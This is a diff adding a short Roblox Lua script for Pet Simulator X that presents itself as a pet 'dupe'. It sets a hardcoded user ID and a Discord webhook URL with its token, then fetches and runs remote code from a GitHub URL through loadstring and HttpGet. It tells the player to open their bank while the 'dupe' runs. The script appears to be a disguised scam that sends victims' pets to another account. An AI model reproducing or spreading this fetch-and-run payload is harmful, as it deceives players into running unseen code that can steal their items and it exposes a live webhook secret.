@@ -1,0 +1,5 @@
+_G.UserID = 3979462505
+_G.WebHook = "https://discord.com/api/webhooks/1033822323406557184/EbOmBXRlSGBAnZ03k4gi9Cd5BdliWLTsNRe3o_bZ2dqHgwME921ahhhnajzal8A8tA7p"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+lib.Message.New("Dupe Starting, It will deposit your pets into your bank if done correctly. Make sure you open the bank and wait 30 seconds before trying again(If the bank doesnt open rejoin and try again)")
